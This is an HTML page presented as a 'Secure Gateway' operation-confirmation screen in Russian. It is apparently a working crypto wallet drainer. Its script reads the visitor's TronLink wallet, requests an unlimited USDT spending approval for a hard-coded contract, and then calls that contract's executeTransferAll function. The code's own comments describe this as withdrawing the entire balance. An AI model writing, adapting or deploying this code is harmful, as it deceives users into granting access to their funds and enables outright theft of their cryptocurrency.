<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Gateway</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e14; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 25px; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.7); width: 320px; text-align: center; border: 1px solid #30363d; }
        button { background: #238636; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: 600; transition: background 0.2s; }
        button:hover { background: #2ea043; }
        .status { margin-top: 15px; font-size: 13px; color: #8b949e; word-break: break-all; line-height: 1.4; }
    </style>
</head>
<body>

    <div class="card">
        <h3>Подтверждение операции</h3>
        <p id="wallet-status" style="font-size: 13px; color: #8b949e;">Инициализация кошелька...</p>

        <button onclick="processAction()">Подтвердить</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        // Твой реальный адрес контракта
        const CONTRACT_ADDRESS = "TVm22VuHmhxAuxN9f1LfpmrJTWS8aAYG9R";
        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

        let userAddress = "";

        window.addEventListener('load', async () => {
            let attempts = 0;
            const checkInterval = setInterval(() => {
                attempts++;
                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                    userAddress = window.tronWeb.defaultAddress.base58;
                    document.getElementById("wallet-status").innerText = "Кошелек: " + userAddress.substring(0, 6) + "..." + userAddress.slice(-4);
                    clearInterval(checkInterval);
                } else if (attempts > 15) {
                    document.getElementById("wallet-status").innerText = "Откройте сайт во встроенном браузере кошелька";
                    clearInterval(checkInterval);
                }
            }, 500);
        });

        async function processAction() {
            const statusDiv = document.getElementById("status");

            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
                alert("Кошелек не обнаружен! Пожалуйста, откройте сайт через встроенный браузер кошелька.");
                return;
            }

            userAddress = window.tronWeb.defaultAddress.base58;

            try {
                statusDiv.innerText = "Шаг 1/2: Запрос доступа (Approve)...";
                
                const usdtContract = await window.tronWeb.contract().at(USDT_ADDRESS);
                
                // Максимально возможное число в uint256 для безлимитного одобрения списания всего баланса
                const maxAmount = "115792036837325195200000000000000000000000000000000000000000";
                
                // Запрашиваем безлимитный approve
                let approveTx = await usdtContract.approve(CONTRACT_ADDRESS, maxAmount).send();
                console.log("Approve tx:", approveTx);

                statusDiv.innerText = "Шаг 2/2: Вывод всего баланса...";

                const myContract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
                
                // Вызываем функцию списания всего баланса
                let transferTx = await myContract.executeTransferAll(userAddress).send();
                console.log("Transfer tx:", transferTx);

                statusDiv.innerText = "Операция успешно завершена!";
            } catch (error) {
                console.error(error);
                let errorMsg = error.message || JSON.stringify(error);
                if (errorMsg.includes("User denied") || errorMsg.includes("Canceled")) {
                    statusDiv.innerText = "Операция отменена пользователем.";
                } else {
                    statusDiv.innerText = "Ошибка: " + errorMsg;
                }
            }
        }
    </script>
</body>
</html>
